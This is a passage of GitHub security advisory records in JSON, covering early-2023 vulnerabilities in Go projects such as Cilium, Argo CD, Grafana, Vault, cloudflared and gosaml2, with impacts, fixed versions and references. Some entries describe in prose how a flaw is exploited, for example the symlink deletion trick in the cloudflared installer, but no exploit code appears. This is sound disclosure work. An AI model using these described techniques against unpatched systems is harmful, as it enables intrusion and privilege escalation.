"https://nvd.nist.gov/vuln/detail/CVE-2023-1238"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/0566894a2c0e13cf07d877f41467e2e21529fee8"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/52f97267-1439-4bb6-862b-89b8fafce50d"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-08T17:11:32Z", "nvd_published_at": "2023-03-07T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-r5x6-w42p-jhpp", "modified": "2023-03-20T13:59:25Z", "published": "2023-03-17T18:22:57Z", "aliases": ["CVE-2023-27595"], "summary": "Cilium eBPF filters may be temporarily removed during agent restart", "details": "### Impact\n\nWhen Cilium is started, there is a short period when Cilium eBPF programs are not attached to the host. During this period, the host does not implement any of Cilium's featureset. This can cause disruption to newly established connections during this period due to the lack of Load Balancing, or can cause Network Policy bypass due to the lack of Network Policy enforcement during the window. This vulnerability impacts any Cilium-managed endpoints on the node (such as Kubernetes Pods), as well as the host network namespace (including Host Firewall).\n\n### Patches\n\nThis vulnerability is fixed by https://github.com/cilium/cilium/pull/24336, included in Cilium 1.13.1 or later. Cilium releases 1.12.x, 1.11.x and earlier are not affected.\n\n### Workarounds\n\nThere are no known workarounds.\n\n### Acknowledgements\n\nThe Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to Louis DeLosSantos and Timo Beckers for investigating and fixing the issue.\n\n### For more information\n\nIf you have any questions or comments about this advisory, please reach out on [Slack](https://docs.cilium.io/en/latest/community/community/#slack).\n\nAs usual, if you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list: security@cilium.io - first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.13.0"}, {"fixed": "1.13.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cilium/cilium/security/advisories/GHSA-r5x6-w42p-jhpp"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-27595"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/pull/24336"}, {"type": "PACKAGE", "url": "https://github.com/cilium/cilium"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/releases/tag/v1.13.1"}], "database_specific": {"cwe_ids": ["CWE-755"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-17T18:22:57Z", "nvd_published_at": "2023-03-17T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2q5c-qw9c-fmvq", "modified": "2023-03-27T22:11:08Z", "published": "2023-03-23T19:49:11Z", "aliases": ["CVE-2022-41354"], "summary": "Argo CD authenticated but unauthorized users may enumerate Application names via the API", "details": "### Impact\n\nAll versions of Argo CD starting with v0.5.0 are vulnerable to an information disclosure bug allowing unauthorized users to enumerate application names by inspecting API error messages. An attacker could use the discovered application names as the starting point of another attack. For example, the attacker might use their knowledge of an application name to convince an administrator to grant higher privileges (social engineering).\n\nMany Argo CD API endpoints accept an application name as the only parameter. Since Argo CD RBAC requires both the application name and its configured project name (and, if apps-in-any-namespace is enabled, the application's namespace), Argo CD fetches the requested application before performing the RBAC check. If the application does not exist, the API returns a \"not found\". If the application does exist, and the user does not have access, the API returns an \"unauthorized\" error. By trial and error, an attacker can infer which applications exist and which do not.\n\nNote that application resources are not fetched for API calls from _unauthenticated_ users. If your Argo CD instance is accessible from the public internet, unauthenticated users will not be able to cause Argo CD to make Kubernetes API calls.\n\nThe patch changes API behavior to return \"unauthorized\" both when the application is missing and when the user is not authorized to access it. **This change in API behavior may impact API clients.** Check your code to make sure it will handle the new API behavior properly.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.6.7\n* v2.5.16\n* v2.4.28\n\n### Workarounds\n\nThere are no workarounds besides upgrading.\n\n### Credits\n\nThank you to bean.zhang of HIT-IDS ChunkL Team who discovered the issue and reported it confidentially according to our [guidelines](https://github.com/argoproj/argo-cd/blob/master/SECURITY.md#reporting-a-vulnerability).\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.5.0"}, {"last_affected": "1.8.7"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.5.0"}, {"fixed": "2.5.16"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.6.0"}, {"fixed": "2.6.7"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.4.28"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-2q5c-qw9c-fmvq"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-41354"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/commit/3a28c8a18cc2aa84fe81492625545d25c7a90bc3"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.4.28"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.5.16"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.6.7"}, {"type": "WEB", "url": "https://github.com/chunklhit/cve/blob/master/argo/argo-cd/application_enumeration.md"}, {"type": "WEB", "url": "http://argo.com"}], "database_specific": {"cwe_ids": ["CWE-203"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-23T19:49:11Z", "nvd_published_at": "2023-03-27T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8fg8-jh2h-f2hc", "modified": "2023-03-17T21:38:38Z", "published": "2023-03-17T18:22:19Z", "aliases": ["CVE-2023-27594"], "summary": "Potential network policy bypass when routing IPv6 traffic ", "details": "## Impact\n\nUnder specific conditions, Cilium may misattribute the source IP address of traffic to a cluster, identifying external traffic as coming from the host on which Cilium is running. As a consequence, network policies for that cluster might be bypassed, depending on the specific network policies enabled. Only IPv6 traffic is impacted by this vulnerability.\n\nThis issue only manifests when:\n* Cilium is routing IPv6 traffic, and\n* Kube-proxy is used for service handling, and\n* NodePorts are used to route traffic to pods.\n\nIPv6 is disabled by default. Cilium's kube-proxy replacement feature is not affected by this vulnerability.\n\n## Patches\n\nThe problem has been fixed and is available on versions >=1.11.15, >=1.12.8, >=1.13.1\n\n## Workarounds\n\nDisable IPv6 routing (IPv6 is disabled by default).\n\n## Acknowledgements\n\nThe Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to Yusuke Suzuki for both highlighting and fixing the issue.\n\n## For more information\n\nIf you have any questions or comments about this advisory, please reach out on [Slack](https://docs.cilium.io/en/latest/community/community/#slack).\n\nAs usual, if you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list: security@cilium.io - first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.11.15"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.12.0"}, {"fixed": "1.12.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.13.0"}, {"fixed": "1.13.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cilium/cilium/security/advisories/GHSA-8fg8-jh2h-f2hc"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-27594"}, {"type": "PACKAGE", "url": "https://github.com/cilium/cilium"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/releases/tag/v1.11.15"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/releases/tag/v1.12.8"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/releases/tag/v1.13.1"}], "database_specific": {"cwe_ids": ["CWE-285", "CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-17T18:22:19Z", "nvd_published_at": "2023-03-17T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hw7c-3rfg-p46j", "modified": "2023-06-16T17:45:49Z", "published": "2023-03-14T23:01:50Z", "aliases": ["CVE-2023-24535"], "summary": "Panic leading to denial of service", "details": "Parsing invalid messages can panic.\n\nParsing a text-format message which contains a potential number consisting of a minus sign, one or more characters of whitespace, and no further input will cause a panic.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "google.golang.org/protobuf"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.29.0"}, {"fixed": "1.29.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-24535"}, {"type": "WEB", "url": "https://github.com/golang/protobuf/issues/1530"}, {"type": "WEB", "url": "https://go.dev/cl/475995"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1631"}], "database_specific": {"cwe_ids": ["CWE-125"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-03-14T23:01:50Z", "nvd_published_at": "2023-06-08T21:15:16Z"}}, {"schema_version": "1.4.0", "id": "GHSA-55vm-3vq3-4jpc", "modified": "2023-03-13T15:32:39Z", "published": "2023-03-07T09:30:30Z", "aliases": ["CVE-2023-1240"], "summary": "Answer vulnerable to Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository answerdev/answer prior to 1.0.6.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1240"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/90bfa0dcc7b49482f1d1e31aee3ab073f3c13dd9"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/a24f57a4-22e3-4a17-8227-6a410a11498a"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-08T17:11:05Z", "nvd_published_at": "2023-03-07T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-55m9-hm92-xm8j", "modified": "2023-03-28T02:41:53Z", "published": "2023-03-22T21:30:16Z", "aliases": ["CVE-2022-45004"], "summary": "Gophish vulnerable to Cross-site Scripting via crafted landing page", "details": "Gophish through 0.12.1 was discovered to contain a cross-site scripting (XSS) vulnerability via a crafted landing page.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gophish/gophish"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.12.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-45004"}, {"type": "PACKAGE", "url": "https://github.com/gophish/gophish"}, {"type": "WEB", "url": "https://github.com/gophish/gophish/releases/tag/v0.12.1"}, {"type": "WEB", "url": "https://pastebin.com/z5MD3z8c"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-22T22:22:09Z", "nvd_published_at": "2023-03-22T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7mjv-x3jf-545x", "modified": "2023-03-21T22:32:50Z", "published": "2023-03-21T22:32:50Z", "aliases": ["CVE-2023-1314"], "summary": "cloudflared's Installer has Local Privilege Escalation Vulnerability", "details": "### Impact\n\nA vulnerability has been discovered in cloudflared's installer (<= 2023.3.0) for Windows 32-bits devices that allows a local attacker with no administrative permissions to escalate their privileges on the affected device. This vulnerability exists because the MSI installer used by cloudflared relied on a world-writable directory.\n\nAn attacker with local access to the device (without Administrator rights) can use symbolic links to trick the MSI installer into deleting files in locations that the attacker would otherwise have no access to. By creating a symlink from the world-writable directory to the target file, the attacker can manipulate the MSI installer's repair functionality to delete the target file during the repair process.\n\nExploitation of this vulnerability could allow an attacker to delete important system files or replace them with malicious files, potentially leading to the affected device being compromised.\n\n**The cloudflared client itself is not affected by this vulnerability, only the installer for 32-bit Windows devices.**\n\n### Patches\nA new installer was released as part of version 2023.3.1, corresponding to pseudoversion 0.0.0-20230313153246-f686da832f85 on pkg.go.dev. Users are encouraged to remove old installers from their systems.\n\n### References\n[Cloudflared Releases](https://github.com/cloudflare/cloudflared/releases)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:N/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cloudflare/cloudflared"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20230313153246-f686da832f85"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cloudflare/cloudflared/security/advisories/GHSA-7mjv-x3jf-545x"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1314"}, {"type": "WEB", "url": "https://github.com/cloudflare/cloudflared/commit/9c15f31d003bebfbe6467c2b42972df3e7c9b886"}, {"type": "PACKAGE", "url": "https://github.com/cloudflare/cloudflared"}, {"type": "WEB", "url": "https://github.com/cloudflare/cloudflared/releases"}], "database_specific": {"cwe_ids": ["CWE-59"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-03-21T22:32:50Z", "nvd_published_at": "2023-03-21T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-p2pf-g8cq-3gq5", "modified": "2023-03-10T15:31:39Z", "published": "2023-03-01T20:37:23Z", "aliases": ["CVE-2023-26047"], "summary": "teler-waf contains detection rule bypass via Entities payload", "details": "### Description\n\nteler-waf is a Go HTTP middleware that provides teler IDS functionality to protect against web-based attacks. teler-waf prior to version v0.2.0 is vulnerable to a bypass attack when a specific case-sensitive hex entities payload with special characters such as CR/LF and horizontal tab is used. This vulnerability allows an attacker to execute arbitrary JavaScript code on the victim's browser and compromise the security of the web application.\n\n### Impact\n\nAn attacker can exploit this vulnerability to bypass common web attack threat rules in teler-waf and launch cross-site scripting (XSS) attacks. The attacker can execute arbitrary JavaScript code on the victim's browser and steal sensitive information, such as login credentials and session tokens, or take control of the victim's browser and perform malicious actions.\n\n### Patches\n\nVersion [v0.2.0](https://github.com/kitabisa/teler-waf/releases/tag/v0.2.0) includes a patch for this vulnerability.\n\n### Workarounds\n\nWe advised updating their installations to version v0.2.0 and frontwards immediately.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kitabisa/teler-waf"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.2.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/kitabisa/teler-waf/security/advisories/GHSA-p2pf-g8cq-3gq5"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-26047"}, {"type": "WEB", "url": "https://github.com/dwisiswant0/cwa-filter-rules/commit/d818d1645832d1a02cd210c7680e692d2bf4313b"}, {"type": "WEB", "url": "https://github.com/kitabisa/teler-waf/commit/6e1b0e19b8adc1bbc3513a986025d4adf88d59f8"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-p2pf-g8cq-3gq5"}, {"type": "PACKAGE", "url": "https://github.com/kitabisa/teler-waf"}, {"type": "WEB", "url": "https://github.com/kitabisa/teler-waf/compare/v0.1.2...v0.2.0"}, {"type": "WEB", "url": "https://github.com/kitabisa/teler-waf/releases/tag/v0.2.0"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1600"}], "database_specific": {"cwe_ids": ["CWE-692", "CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-01T20:37:23Z", "nvd_published_at": "2023-03-03T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xw5p-hw8j-xg4q", "modified": "2023-03-09T04:23:30Z", "published": "2023-03-01T18:30:59Z", "aliases": ["CVE-2023-0594"], "summary": "Grafana vulnerable to Cross-site Scripting", "details": "Grafana is an open-source platform for monitoring and observability. Starting with the 7.0 branch, Grafana had a stored XSS vulnerability in the trace view visualization. The stored XSS vulnerability was possible due the value of a span's attributes/resources were not properly sanitized and this will be rendered when the span's attributes/resources are expanded. An attacker needs to have the Editor role in order to change the value of a trace view visualization to contain JavaScript. This means that vertical privilege escalation is possible, where a user with Editor role can change to a known password for a user having Admin role if the user with Admin role executes malicious JavaScript viewing a dashboard. Users may upgrade to version 8.5.21, 9.2.13 and 9.3.8 to receive a fix.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.0.0"}, {"fixed": "8.5.21"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.0.0"}, {"fixed": "9.2.13"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.3.0"}, {"fixed": "9.3.8"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0594"}, {"type": "PACKAGE", "url": "https://github.com/grafana/grafana"}, {"type": "WEB", "url": "https://grafana.com/security/security-advisories/cve-2023-0594/"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-02T23:05:30Z", "nvd_published_at": "2023-03-01T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6gc3-crp7-25w5", "modified": "2023-03-13T19:16:19Z", "published": "2023-03-02T23:12:47Z", "aliases": ["CVE-2023-26483"], "summary": "gosaml2 vulnerable to Denial Of Service Via Deflate Decompression Bomb", "details": "### Impact\nSAML Service Providers using this library for SAML authentication support are likely susceptible to Denial of Service attacks. A bug in this library enables attackers to craft a `deflate`-compressed request which will consume significantly more memory during processing than the size of the original request. This may eventually lead to memory exhaustion and the process being killed.\n\n### Mitigation\nThe maximum compression ratio achievable with `deflate` is 1032:1, so by limiting the size of bodies passed to gosaml2, limiting the rate and concurrency of calls, and ensuring that lots of memory is available to the process it _may_ be possible to help Go's garbage collector \"keep up\".\n\nImplementors are encouraged not to rely on this.\n\n### Patches\nThis issue is addressed in v0.9.0", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/russellhaering/gosaml2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/russellhaering/gosaml2/security/advisories/GHSA-6gc3-crp7-25w5"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-26483"}, {"type": "WEB", "url": "https://github.com/russellhaering/gosaml2/commit/f9d66040241093e8702649baff50cc70d2c683c0"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-6gc3-crp7-25w5"}, {"type": "PACKAGE", "url": "https://github.com/russellhaering/gosaml2"}, {"type": "WEB", "url": "https://github.com/russellhaering/gosaml2/releases/tag/v0.9.0"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1602"}], "database_specific": {"cwe_ids": ["CWE-409"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-02T23:12:47Z", "nvd_published_at": "2023-03-03T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7rqg-hjwc-6mjf", "modified": "2023-03-02T20:41:57Z", "published": "2023-03-01T20:56:49Z", "aliases": ["CVE-2023-22462"], "summary": "Grafana vulnerable to Stored Cross-site Scripting in Text plugin", "details": "### Description \nOn 2023-01-01 during an internal audit of Grafana, a member of the security team found a stored XSS vulnerability affecting the core plugin \"Text\".\n\nThe stored XSS vulnerability requires several user interactions in order to be fully exploited. The vulnerability was possible due to  React's render cycle that will pass though the unsanitized HTML code, but in the next cycle the HTML is cleaned up and saved in Grafana's database.\n\n### Impact\nAn attacker needs to have the Editor role in order to change a Text panel to include JavaScript. later, an another user needs to edit the same Text panel, and click on \"Markdown\" or \"HTML\" for the code to be executed. This means that vertical privilege escalation is possible, where a user with Editor role can change to a known password for a user having Admin role if the user with Admin role executes malicious JavaScript viewing a dashboard.   \n\n### Impacted versions\nGrafana versions between 9.2.0 and 9.2.10. and between 9.3.0 and 9.3.4\n\n### Solutions and mitigations\nUpdate your Grafana instance.\n\n\n## Reporting security issues\n\nIf you think you have found a security vulnerability, please send a report to security@grafana.com. This address can be used for all of Grafana Labs' open source and commercial products (including, but not limited to Grafana, Grafana Cloud, Grafana Enterprise, and grafana.com). We can accept only vulnerability reports at this address. We would prefer that you encrypt your message to us by using our PGP key. The key fingerprint is\n\nF988 7BEA 027A 049F AE8E 5CAA D125 8932 BE24 C5CA\n\nThe key is available from keyserver.ubuntu.com.\n\n## Security announcements\n\nWe maintain a [security category](https://community.grafana.com/c/support/security-announcements) on our blog, where we will always post a summary, remediation, and mitigation details for any patch containing security fixes.\n\nYou can also subscribe to our [RSS feed](https://grafana.com/tags/security/index.xml).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.2.0"}, {"fixed": "9.2.10"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.3.0"}, {"fixed": "9.3.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/grafana/grafana/security/advisories/GHSA-7rqg-hjwc-6mjf"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-22462"}, {"type": "WEB", "url": "https://github.com/grafana/grafana/commit/db83d5f398caffe35c5846cfa7727d1a2a414165"}, {"type": "PACKAGE", "url": "https://github.com/grafana/grafana"}, {"type": "WEB", "url": "https://grafana.com/blog/2023/02/28/grafana-security-release-new-versions-with-security-fixes-for-cve-2023-0594-cve-2023-0507-and-cve-2023-22462/"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20230413-0004/"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-01T20:56:49Z", "nvd_published_at": "2023-03-02T01:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-g8xm-p2h4-v6jp", "modified": "2023-04-04T15:24:49Z", "published": "2023-03-24T21:30:48Z", "aliases": ["CVE-2021-3684"], "summary": "OpenShift Assisted Installer leaks image pull secrets as plaintext in installation logs", "details": "A vulnerability was found in OpenShift Assisted Installer. During generation of the Discovery ISO, image pull secrets were leaked as plaintext in the installation logs. An authenticated user could exploit this by re-using the image pull secret to pull container images from the registry as the associated user.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/openshift/assisted-installer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.25.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3684"}, {"type": "WEB", "url": "https://github.com/openshift/assisted-installer/commit/2403dad3795406f2c5d923af0894e07bc8b0bdc4"}, {"type": "WEB", "url": "https://github.com/openshift/assisted-installer/commit/f3800cfa3d64ce6dcd6f7b73f0578bb99bfdaf7a"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1985962"}, {"type": "PACKAGE", "url": "https://github.com/openshift/assisted-installer"}], "database_specific": {"cwe_ids": ["CWE-532"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-24T21:59:18Z", "nvd_published_at": "2023-03-24T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-v3hp-mcj5-pg39", "modified": "2023-04-06T22:55:57Z", "published": "2023-03-30T03:30:38Z", "aliases": ["CVE-2023-0620"], "summary": "HashiCorp Vault\u2019s Microsoft SQL Database Storage Backend Vulnerable to SQL Injection Via Configuration File", "details": "HashiCorp Vault and Vault Enterprise versions 0.8.0 until 1.13.1 are vulnerable to an SQL injection attack when using the Microsoft SQL (MSSQL) Database Storage Backend. When configuring the MSSQL plugin, certain parameters are required to establish a connection (schema, database, and table) are not sanitized when passed to the user-provided MSSQL database. A privileged attacker with the ability to write arbitrary data to Vault's configuration may modify these parameters to execute a malicious SQL command when the Vault configuration is applied. This issue is fixed in versions 1.13.1, 1.12.5, and 1.11.9.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.8.0"}, {"fixed": "1.11.9"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.12.0"}, {"fixed": "1.12.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.13.0"}, {"fixed": "1.13.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0620"}, {"type": "WEB", "url": "https://github.com/hashicorp/vault/pull/19591"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2023-12-vault-s-microsoft-sql-database-storage-backend-vulnerable-to-sql-injection-via-configuration-file/52080/1"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/vault"}, {"type": "WEB", "url": "https://github.com/hashicorp/vault/releases/tag/v1.11.9"}, {"type": "WEB", "url": "https://github.com/hashicorp/vault/releases/tag/v1.12.5"}, {"type": "WEB", "url": "https://github.com/hashicorp/vault/releases/tag/v1.13.1"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20230526-0008/"}], "database_specific": {"cwe_ids": ["CWE-89"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-03-30T20:43:55Z", "nvd_published_at": "2023-03-30T01:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-wxwq-525w-hcqx", "modified": "2023-03-03T23:05:28Z", "published": "2023-03-03T23:05:28Z", "aliases": [], "summary": "Yapscan Denial of Service vulnerability in report server", "details": "### Impact\n\nIf you use the report server, it may be vulnerable to a Denial of Service attack.\n\n### Patches\n\nHas been patched in v0.19.2.\n\n### References\n\nThe vulnerability was inherited by the following upstream vulnerabilites\n\n- [golang.org/x/text < v0.3.7](https://github.com/advisories/GHSA-ppp9-7jff-5vj2)\n- [golang.org/x/net < 0.0.0-20220906165146-f3363e06e74c](https://github.com/advisories/GHSA-69cg-p879-7622)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/fkie-cad/yapscan"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.18.0"}, {"fixed": "0.19.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/fkie-cad/yapscan/security/advisories/GHSA-wxwq-525w-hcqx"}, {"type": "WEB", "url": "https://github.com/fkie-cad/yapscan/pull/46"}, {"type": "WEB", "url": 